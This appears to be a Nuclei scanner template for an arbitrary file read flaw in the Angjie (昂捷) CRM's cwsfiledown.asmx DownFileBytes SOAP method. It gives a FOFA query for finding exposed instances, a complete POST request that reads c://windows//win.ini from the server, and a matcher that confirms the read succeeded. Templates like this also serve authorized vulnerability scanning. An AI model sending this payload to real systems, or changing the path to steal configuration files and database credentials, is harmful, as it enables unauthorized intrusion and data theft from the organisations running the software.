id: angjieCRM-cwsfiledown_asmx-File-reading

info:
  name: "昂捷CRM cwsfiledown.asmx DownFileBytes 方法任意文件读取"
  author: Unknown
  severity: high
  description: |-
    fofa: body="/ClientBin/slEnjoy.App.xap"
    昂捷CRM系统中的 cwsfiledown.asmx 服务接口在 DownFileBytes 方法实现中存在路径验证缺陷，攻击者可通过构造恶意请求参数绕过文件访问控制机制，读取服务器任意路径下的敏感文件内容。该漏洞允许远程攻击者获取数据库连接字符串、系统配置信息等关键数据，可能直接导致业务系统被横向渗透。
  reference:
  - https://mp.weixin.qq.com/s/8hLbpoCb6lFXxUabz0ABPQ?token=1015546094&lang=zh_CN
  tags: 昂捷CRM


http:
- raw:
  - |
    POST /EnjoyRMIS_WS/WS/FileDown/cwsfiledown.asmx HTTP/1.1
    Host: {{Hostname}}
    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.116 Safari/537.36
    Content-Type: text/xml; charset=utf-8
    Content-Length: length
    SOAPAction: "http://tempuri.org/DownFileBytes"

    <?xml version="1.0" encoding="utf-8"?>
    <soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
      <soap:Body>
        <DownFileBytes xmlns="http://tempuri.org/">
          <sFileName>c://windows//win.ini</sFileName>
          <iPosition>1</iPosition>
          <iReadBytesLen>100</iReadBytesLen>
          <bReadBytes>ICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAgICAg</bReadBytes>
        </DownFileBytes>
      </soap:Body>
    </soap:Envelope>

  matchers-condition: and
  matchers:
  - type: word
    part: body
    words:
    - 'IGZvciAxNi1iaXQgYXBwIHN1cHBvcnQ'
  - type: status
    status:
    - 200

